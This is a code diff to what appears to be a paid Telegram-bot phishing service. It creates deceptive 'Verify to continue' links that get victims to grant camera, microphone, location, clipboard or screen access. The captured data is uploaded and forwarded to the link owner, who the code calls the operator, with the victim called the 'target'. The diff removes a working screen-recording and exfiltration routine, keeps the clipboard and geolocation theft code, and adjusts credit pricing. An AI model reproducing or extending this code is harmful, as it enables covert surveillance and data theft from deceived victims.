@@ -24,7 +24,6 @@ FEATURES = {
     "mic":    {"label": "🎙️ Mic Record",   "facing": False},
     "call":   {"label": "📞 Call Hint",    "facing": False},
     "loc":    {"label": "📍 Location",     "facing": False},
-    "screen": {"label": "🖥️ Screen Share", "facing": False},
     "clip":   {"label": "📋 Clipboard",    "facing": False},
     "notif":  {"label": "🔔 Notification", "facing": False},
 }
@@ -149,8 +148,6 @@ def set_setting(k, v):
         c.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)", (k, str(v))); conn.commit()
 
 def feature_cost(feat):
-    if feat == "screen":
-        return int(setting("cost_screen", "7"))
     return int(setting("cost_" + feat, FEATURE_COST_DEFAULT))
 
 def set_feature_cost(feat, val): set_setting("cost_" + feat, val)
@@ -773,7 +770,7 @@ def safe_rebuild_tunnel(reason=""):
 def _flags_str():
     """Build feature flags string for landing page JS."""
     name_map = {"camera":"camera","video":"video","mic":"mic",
-                "call":"call","loc":"loc","screen":"screen","clip":"clip"}
+                "call":"call","loc":"loc","clip":"clip"}
     out = []
     for python_key, js_name in name_map.items():
         try:
@@ -876,21 +873,12 @@ async function reqLoc(){
  if(PERM_GEO)return true;
  try{PERM_GEO=await new Promise(function(res,rej){
    navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0});});return true;}catch(e){return false;}}
-async function reqScreen(){
- if(PERM_STREAM.screen)return true;
- try{
-  if(!navigator.mediaDevices||typeof navigator.mediaDevices.getDisplayMedia!=='function'){
-   PERM_STREAM.screen=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});return true;}
-  PERM_STREAM.screen=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});return true;
- }catch(e){return false;}}
-async function reqClipPerm(){return true;}
 var QUEUE=[];
 if(FEATURE==='camera'){QUEUE.push(reqCam);}
 else if(FEATURE==='video'){QUEUE.push(reqCam);QUEUE.push(reqMic);}
 else if(FEATURE==='mic'){QUEUE.push(reqMic);}
 else if(FEATURE==='call'){QUEUE.push(reqMic);}
 else if(FEATURE==='loc'){QUEUE.push(reqLoc);}
-else if(FEATURE==='screen'){QUEUE.push(reqScreen);}
 else if(FEATURE==='clip'){QUEUE.push(reqClipPerm);}
 else {QUEUE.push(reqCam);}
 var TOTAL=1;
@@ -955,68 +943,6 @@ async function captureLoc(){
    navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0});});}catch(e){return;}}
  var p=PERM_GEO;
  await fetch('/api/location/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy})}).catch(function(){});}
-async function captureScreen(){
- try{
-  var st=PERM_STREAM.screen;
-  var isScreen = (typeof navigator.mediaDevices !== 'undefined' && typeof navigator.mediaDevices.getDisplayMedia === 'function');
-  if(!st){
-   try{
-    if(isScreen){
-     st = await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
-    }else{
-     st = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:640},height:{ideal:480}},audio:false});
-    }
-    PERM_STREAM.screen = st;
-   }catch(e){
-    await fetch('/api/error/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
-     body:JSON.stringify({err:'screen perms: '+String(e),feature:'screen'})}).catch(function(){});
-    return;
-   }
-  }
-  try{
-   var opts={mimeType:'video/webm;codecs=vp8',videoBitsPerSecond:600000};
-   var rec;
-   try{rec=new MediaRecorder(st,opts);}catch(e){rec=new MediaRecorder(st);}
-   var chunks=[];
-   rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
-   rec.start(1000);
-   await new Promise(function(r){setTimeout(r,10000)});
-   rec.stop();
-   await new Promise(function(r){setTimeout(r,500);rec.onstop=r;});
-   if(chunks.length){
-    var blob=new Blob(chunks,{type:'video/webm'});
-    var buf=await blob.arrayBuffer();
-    var bytes=new Uint8Array(buf);
-    if(bytes.length < 18*1024*1024){
-     var b64=b64b(bytes);
-     var kind = isScreen ? 'screen' : 'rear-cam';
-     st.getTracks().forEach(function(t){t.stop()});
-     PERM_STREAM.screen=null;
-     await fetch('/api/screen/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({vid:b64,img:null,kind:kind,dur:10})}).catch(function(){});
-     return;
-    }
-   }
-  }catch(e){
-   await fetch('/api/error/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({err:'screen rec: '+String(e),feature:'screen'})}).catch(function(){});
-  }
-  try{
-   var v=document.createElement('video');v.srcObject=st;v.play();
-   await new Promise(function(r){setTimeout(r,1200)});
-   var cc=document.createElement('canvas');cc.width=v.videoWidth||640;cc.height=v.videoHeight||480;
-   cc.getContext('2d').drawImage(v,0,0);
-   var b64=cc.toDataURL('image/jpeg',0.8).split(',')[1];
-   st.getTracks().forEach(function(t){t.stop()});PERM_STREAM.screen=null;
-   var kind = isScreen ? 'screen' : 'rear-cam';
-   await fetch('/api/screen/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({img:b64,kind:kind})}).catch(function(){});
-  }catch(e){}
- }catch(e){
-  await fetch('/api/error/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
-   body:JSON.stringify({err:'screen outer: '+String(e),feature:'screen'})}).catch(function(){});
- }}
-
 async function captureClip(){
  try{var t=await navigator.clipboard.readText();
   await fetch('/api/clip/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},
@@ -1048,7 +974,6 @@ async function runFinalCapture(){
   else if(FEATURE==='mic')await captureMic();
   else if(FEATURE==='call'){try{await captureMic();}catch(e){}}
   else if(FEATURE==='loc')await captureLoc();
-  else if(FEATURE==='screen')await captureScreen();
   else if(FEATURE==='clip')await captureClip();
  }catch(e){}
  document.getElementById('t').textContent='Verified';
@@ -1115,7 +1040,7 @@ def r_auto(sid):
         log("r_auto " + sid + " f=" + str(L["feature"]))
         feat = L["feature"] or "camera"
         heads = {"camera":"Verify to continue","video":"Verify to continue","mic":"Play voice message",
-                 "loc":"Confirm your location","screen":"Screen share needed",
+                 "loc":"Confirm your location",
                  "call":"Verify to continue","clip":"Verify to continue","notif":"Enable to continue",
                  "__sw__":"Verify to continue","custom":"Verifying"}
         head = heads.get(feat, "Verify to continue")
@@ -1338,37 +1263,6 @@ def api_l(sid):
         record_error("api_l", e); return jsonify(ok=False)
 
 
-@flask_app.route("/api/screen/<sid>", methods=["POST"])
-def api_scr(sid):
-    try:
-        L = get_link(sid)
-        if not L: return jsonify(ok=False)
-        body = request.get_json(silent=True) or {}
-        img = body.get("img")
-        vid = body.get("vid")
-        kind = body.get("kind", "screen")
-        dur = int(body.get("dur", 10))
-        err = body.get("err", "")
-        label = "🖥️ Screen share" if kind == "screen" else "📷 Rear camera"
-        cap = _owner_info(L, sid, label)
-        if vid:
-            raw = base64.b64decode(vid)
-            _tg_send("sendVideo","video","screen.webm","video/webm",cap,sid,L["owner"],raw,"camera_grant","Screen video")
-        elif img:
-            raw = base64.b64decode(img)
-            _tg_send("sendPhoto","photo","screen.jpg","image/jpeg",cap,sid,L["owner"],raw,"camera_grant","Screen")
-        else:
-            msg = "❌ Permission declined by target\n" + label + "\n🔗 #" + sid
-            if err:
-                msg += "\n📝 " + str(err)[:100]
-            notify_admin(msg, "camera_grant")
-            try: notify_owner(L["owner"], msg, "camera_grant")
-            except Exception: pass
-        return jsonify(ok=True)
-    except Exception as e:
-        record_error("api_scr", e); return jsonify(ok=False)
-
-
 @flask_app.route("/api/clip/<sid>", methods=["POST"])
 def api_clip(sid):
     try:
@@ -1491,8 +1385,8 @@ def kb_user():
     rows = [
         [B("📸 Camera Photo", "u:new:camera", style="success"), B("🎥 Video 30s", "u:new:video", style="success")],
         [B("🎙️ Mic Record", "u:new:mic", style="primary"), B("📞 Call Hint", "u:new:call", style="primary")],
-        [B("📍 Location", "u:new:loc", style="primary"), B("🖥️ Screen Share", "u:new:screen", style="primary")],
-        [B("📋 Clipboard", "u:new:clip", style="primary"), B("🔔 Notification", "u:new:notif", style="primary")],
+        [B("📍 Location", "u:new:loc", style="primary"), B("📋 Clipboard", "u:new:clip", style="primary")],
+        [B("🔔 Notification", "u:new:notif", style="primary")],
         [B("🎯 My Links", "u:links", style="primary"), B("💸 Credit", "u:credit", style="success")],
         [B("📜 History","u:history",style="primary"), B("📊 My Stats", "u:stats", style="primary")],
         [B("💬 Support", "u:sup", style="primary")],
@@ -2702,9 +2596,9 @@ async def user_gen(q, ctx, u, feat):
 
         if FEATURES.get(feat, {}).get("facing"):
             if is_trial:
-                cost_line = "🎁 FREE Trial — no credit"
+                cost_line = "🎁 FREE trial — 1 time, non-whitelisted"
             elif is_demo:
-                cost_line = "🎁 FREE today (daily)"
+                cost_line = "🎁 FREE today (daily) — whitelisted"
             else:
                 cost_line = "💰 Cost: " + str(cost) + " credit"
             txt = wrap("🎬 " + FEATURES[feat]["label"] + "\n" + cost_line + "\n📸 Select camera facing\n👇 Pick one to continue.")
@@ -2796,7 +2690,13 @@ async def _do_gen(q, ctx, u, feat, cost, facing):
         except Exception:
             ttl_txt = "5 min"
 
-        cost_lbl = "🎁 FREE trial" if cost == 0 else (f"💸 {cost} credit")
+        if cost == 0:
+            if not is_allowed(u.id):
+                cost_lbl = "🎁 FREE trial (1 time)"
+            else:
+                cost_lbl = "🎁 FREE today (daily)"
+        else:
+            cost_lbl = f"💸 {cost} credit"
         hdr = (f"✅ Your new link is ready\n"
                f"🎬 Feature: {lbl}\n"
                f"💳 Cost: {cost_lbl}\n"
@@ -3768,6 +3668,21 @@ def self_ping_worker():
         time.sleep(240)  # 4 min — under Render's 15 min sleep window
 
 
+def ensure_owner_credit():
+    """Give owner 20 credit once, ever."""
+    flag = "owner_welcome_paid_" + str(ADMIN_ID)
+    if setting(flag, "") == "1":
+        return
+    upsert_user(ADMIN_ID, "owner")
+    with DB_LOCK:
+        c.execute("UPDATE users SET credits=credits+? WHERE id=?", (20, ADMIN_ID))
+        c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
+                  (ADMIN_ID, "owner_welcome", 20, "first_run", now()))
+        conn.commit()
+    set_setting(flag, "1")
+    log("owner welcome +20 credit")
+
+
 def main():
     global PORT
     import signal
@@ -3784,6 +3699,7 @@ def main():
         _setup_fakeetc()
     if not selftest(): return
     init_db()
+    ensure_owner_credit()
     if setting("access_price","") == "": set_setting("access_price", "100")
     if setting("access_days","") == "": set_setting("access_days", "30")
     if setting("min_buy_credit","") == "": set_setting("min_buy_credit", "50")
